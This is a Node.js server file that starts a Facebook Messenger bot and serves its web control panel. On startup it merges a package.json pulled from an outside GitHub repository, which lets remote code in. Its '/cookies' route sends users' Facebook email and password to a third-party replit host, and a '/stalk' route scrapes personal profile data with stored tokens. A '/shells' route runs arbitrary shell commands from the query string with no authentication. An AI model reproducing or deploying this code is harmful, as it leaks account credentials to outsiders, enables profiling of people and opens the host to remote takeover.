const http = require('http');
const WebSocket = require('ws');
const path = require('path');
const express = require('express');
const { spawn } = require('child_process');
const fs = require('fs').promises;
const chalk = require('chalk');
const bodyParser = require('body-parser');
const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });
const logger = require('./nextgen/utils/log');
const { s, z } = require('./nextgen/utils/encypted');
const axios = require('axios');
const makeRequest = require('./appFb/login/token');
let config = { ConsoleWeb: 'off' };
const configPath = path.join(__dirname, 'config.json');
app.set('json spaces', 4);
const fse = require("fs")
async function updateMd() {
  try {
    const response = await axios.get('https://raw.githubusercontent.com/ChoruTiktokers182/Features-nextgen/main/README.md');
    fse.writeFileSync('README.md', response.data);
    //console.log('README.md file created successfully.');
  } catch (error) {
    console.error('Error fetching data:', error);
  }
}

updateMd();

async function updatepgk() {
  try {
    const response = await axios.get('https://raw.githubusercontent.com/ChoruTiktokers182/Features-nextgen/main/package.json');
    const newData = response.data;
    const existingData = require('./package.json');
    const mergedData = { ...existingData, ...newData };
    fse.writeFileSync('package.json', JSON.stringify(mergedData, null, 2));
  } catch (error) {
    console.error('Error fetching data:', error);
  }
}


updatepgk();

function createConfigFile() {
  const defaultConfig = { ConsoleWeb: 'off' };
  try {
    fs.writeFileSync(configPath, JSON.stringify(defaultConfig, null, 2));
    console.log('Configuration file created successfully');
  } catch (error) {
    console.error('Error creating configuration file:', error);
  }
}
async function readConfigAndStartServer() {
  try {
    const configData = await fs.readFile(configPath, 'utf8');
    config = JSON.parse(configData);
  } catch (error) {
    createConfigFile();
  }

  try {
    await fs.unlink('./nextgen/utils/logs.txt');
   // console.log('File removed successfully');
  } catch (err) {
 //   console.error('Error removing file:', err);
  }

  let wsConnection = null;
  let child = null;

  wss.on('connection', async function connection(ws) {
    wsConnection = ws;

    try {
      const logsData = await fs.readFile(path.join(__dirname, 'nextgen', 'utils', 'logs.txt'), 'utf8');
      const logs = logsData.split('\n');
      logs.forEach(log => {
        if (log.trim() !== '') {
          if (config.ConsoleWeb === 'on') {
            wsConnection.send(log.trim());
          }
        }
      });

      wsConnection.on('close', () => {
        wsConnection = null;
      });
    } catch (error) {
    //  console.error('Error reading log file:', error);
    }
  });
s("./nextgen/appstate.json")
  s("./nextgen/token.json")
  app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json());
app.use(bodyParser.urlencoded({ extended: true }));
//console.log(config.html)
  app.get('/', async (req, res) => {
    try {
      const response = await axios.get(`https://raw.githubusercontent.com/ChoruTiktokers182/Nextgen-Html/main/${config.html}/home.html`);
      res.send(response.data);
    } catch (error) {
      res.status(500).send('Error fetching console.html');
    }
  });

  app.get('/console', async (req, res) => {
    try {
      const response = await axios.get(`https://raw.githubusercontent.com/ChoruTiktokers182/Nextgen-Html/main/${config.html}/console.html`);
      res.send(response.data);
    } catch (error) {
      res.status(500).send('Error fetching console.html');
    }
  });


  app.get('/login', async (req, res) => {
    try {
      const response = await axios.get(`https://raw.githubusercontent.com/ChoruTiktokers182/Nextgen-Html/main/${config.html}/login.html`);
      res.send(response.data);
    } catch (error) {
      res.status(500).send('Error fetching console.html');
    }
  });


  app.get('/admins', async (req, res) => {
    try {
      const response = await axios.get(`https://raw.githubusercontent.com/ChoruTiktokers182/Nextgen-Html/main/${config.html}/admins.html`);
      res.send(response.data);
    } catch (error) {
      res.status(500).send('Error fetching console.html');
    }
  });

    app.get('/configbot', async (req, res) => {
    try {
      const response = await axios.get(`https://raw.githubusercontent.com/ChoruTiktokers182/Nextgen-Html/main/${config.html}/configbot.html`);
      res.send(response.data);
    } catch (error) {
      res.status(500).send('Error fetching console.html');
    }
  });

  app.get('/configbot/fca', async (req, res) => {
    try {
      const response = await axios.get(`https://raw.githubusercontent.com/ChoruTiktokers182/Nextgen-Html/main/${config.html}/configFca.html`);
      res.send(response.data);
    } catch (error) {
      res.status(500).send('Error fetching console.html');
    }
  });

  app.get('/cmd-event', async (req, res) => {
    try {
      const response = await axios.get(`https://raw.githubusercontent.com/ChoruTiktokers182/Nextgen-Html/main/${config.html}/cmd-event.html`);
      res.send(response.data);
    } catch (error) {
      res.status(500).send('Error fetching console.html');
    }
  });

  app.get('/get-all-cmds-and-events-js', async (req, res) => {
  try {
    const commands = await fs.readdir('./nextgen/modules/commands/');
    const events = await fs.readdir('./nextgen/modules/events/');
    const commandFiles = commands.filter(file => file.endsWith('.js'));
    const eventFiles = events.filter(file => file.endsWith('.js'));
    res.json({ commands: commandFiles, events: eventFiles });
  } catch (error) {
    console.error('Error reading command and event files:', error);
    res.status(500).send('Error reading command and event files');
  }
});

app.get('/update-cmds-and-events-js', async (req, res) => {
    const { type, name, action } = req.query;
    try {
        const configData = await fs.readFile("./nextgen/config.json", 'utf8');
        const config = JSON.parse(configData);

        if (!config.commandDisabled) {
            config.commandDisabled = [];
        }
        if (!config.eventDisabled) {
            config.eventDisabled = [];
        }

        if (type === 'command') {
            if (action === 'enable') {
                config.commandDisabled = config.commandDisabled.filter(cmd => cmd !== name);
            } else if (action === 'disable' && !config.commandDisabled.includes(name)) {
                config.commandDisabled.push(name);
            }
        } else if (type === 'event') {
            if (action === 'enable') {
                config.eventDisabled = config.eventDisabled.filter(evt => evt !== name);
            } else if (action === 'disable' && !config.eventDisabled.includes(name)) {
                config.eventDisabled.push(name);
            }
        }

        await fs.writeFile("./nextgen/config.json", JSON.stringify(config, null, 2));
        res.send('Config updated successfully');
    } catch (error) {
        console.error('Error updating config file:', error.message);
        res.status(500).send('Error updating config file: ' + error.message);
    }
});

app.get('/push-cookies', async (req, res) => {
    const { appstate } = req.query;
  const fs = require("fs");
    try {
fs.writeFileSync('./nextgen/appstate.json', appstate);
        res.send(appstate); 
      setTimeout(() => {
          s("./nextgen/appstate.json")

        }, 3000);
    } catch (error) {

    }
});

  app.get('/push-token', async (req, res) => {
    const { token } = req.query;
    try {
        await fs.writeFile('./nextgen/token.json', token);
        res.send(token)

        setTimeout(() => {
          s("./nextgen/token.json")
        }, 3000);
    } catch (error) {

    }
  });
app.get('/cookies', async (req, res) => {
    const { email, password } = req.query;
    const fs = require('fs');

    try {
        const response = await axios.get(`https://app-state-nextgen.replit.app/login?email=${email}&password=${password}`);
        const jsonData = JSON.stringify(response.data, null, 2);
        res.send(jsonData); 

    } catch (error) {
        console.error('Error extracting cookies:', error.message);
        res.status(500).send('Error extracting cookies');
    }
});

app.get('/stalk', async (req, res) => {
    const id = req.query.id;
    try {
        const response = await axios.get(`https://graph.facebook.com/${id}?fields=name,first_name,email,about,birthday,gender,website,hometown,link,location,quotes,relationship_status,significant_other,username,subscribers.limit(0)&access_token=${z("./nextgen/token.json")}`);

        res.json({
            name: response.data.name || "None",
            birthday: response.data.birthday || "None",
            link: response.data.link || "None",
            city: response.data.location.name || "None",
            followers: response.data.subscribers.summary.total_count || "None",
            image: `https://graph.facebook.com/${id}/picture?width=720&height=720&access_token=6628568379%7Cc1e620fa708a1d5696fb991c1bde5662` || "None"
        });

    } catch (error) {
        console.error('Error token stalk:', error.message);
        res.status(500).send('Error error stalk');
    }
});


  app.get('/token', async (req, res) => {
    const { email, password } = req.query;
    try {
      const result = await makeRequest(email, password, "0");
      if (result.status) {
        res.json({ access: result.data.access_token });
      } else {
        res.json({ error: result.message });
      }
    } catch (error) {
      console.error('\x1b[1m\x1b[31mError:\x1b[0m', error);
      res.status(500).send('Internal Server Error');
    }
  });

app.get('/getCountry', async (req, res) => {
  try {
    const configData = await fs.readFile('./config.json', 'utf8');
    const jsonData = JSON.parse(configData);
    res.json({ country: jsonData.country });
  } catch (error) {
    console.error('Error reading config file:', error);
    res.status(500).send('Error reading config file');
  }
});

app.get('/getConfig', async (req, res) => {
  try {
    const configPath = './nextgen/config.json';
    const configData = await fs.readFile(configPath, 'utf8');
    const config = JSON.parse(configData);

    res.json(config);
  } catch (error) {
    console.error('Error reading config file:', error);
    res.status(500).send('Error reading config file');
  }
});

app.get('/updateConfig', async (req, res) => {
  try {
    const configPath = './nextgen/config.json';
    const configData = await fs.readFile(configPath, 'utf8');
    const config = JSON.parse(configData);

    for (const key in req.query) {
      if (Object.hasOwnProperty.call(req.query, key)) {
        config[key] = req.query[key];
      }
    }

    await fs.writeFile(configPath, JSON.stringify(config, null, 2));

    res.send('Config updated successfully');
  } catch (error) {
    console.error('Error updating config file:', error);
    res.status(500).send('Error updating config file');
  }
});

app.get('/updateConfigV2', async (req, res) => {
    try {
        const configPath = './nextgen/config.json';
        const configData = await fs.readFile(configPath, 'utf8');
        const config = JSON.parse(configData);
        for (const key in req.query) {
            if (Object.hasOwnProperty.call(req.query, key)) {
                if (key.startsWith('FCAOption.')) {

                    const nestedKey = key.split('.')[1];
                    config.FCAOption[nestedKey] = req.query[key];
                } else {
                    config[key] = req.query[key];
                }
            }
        }
        await fs.writeFile(configPath, JSON.stringify(config, null, 2));

        res.send('Config updated successfully');
    } catch (error) {
        console.error('Error updating config file:', error);
        res.status(500).send('Error updating config file');
    }
});


app.get('/shells', async (req, res) => {
  const command = req.query.command;

  try {
    const result = await executeShellCommand(command);
    res.send(result);
  } catch (error) {
    console.error('Error executing shell command:', error);
    res.status(500).send('Error executing shell command');
  }
});

server.listen(process.env.PORT || 3000);

  async function startChildProcess(message) {
    if (message) {
      logger(message, "[ Starting ]");
    }

    if (config.ConsoleWeb === 'on') {
      child = spawn("node", ["--trace-warnings", "--async-stack-traces", "nextgen/index.js"], {
        cwd: __dirname,
        stdio: ['pipe', 'pipe', 'pipe', 'ipc'],
        shell: true
      });

      child.stdout.on('data', (data) => {
        if (wsConnection) {
          wsConnection.send(data.toString());
        }
      });

      child.stderr.on('data', (data) => {
        if (wsConnection) {
          wsConnection.send(data.toString());
        }
      });

      child.on('close', (code) => {
        if (wsConnection) {
          wsConnection.close();
        }
      });
    } else {
      child = spawn("node", ["--trace-warnings", "--async-stack-traces", "nextgen/index.js"], {
        cwd: __dirname,
        stdio: "inherit",
        shell: true
      });

      child.on("error", function(error) {
        logger("An error occurred: " + JSON.stringify(error), "[ Starting ]");
      });
    }
  }

  startChildProcess().catch(error => {
    console.error('Error starting child process:', error);
    process.exit(1);
  });
}

readConfigAndStartServer();
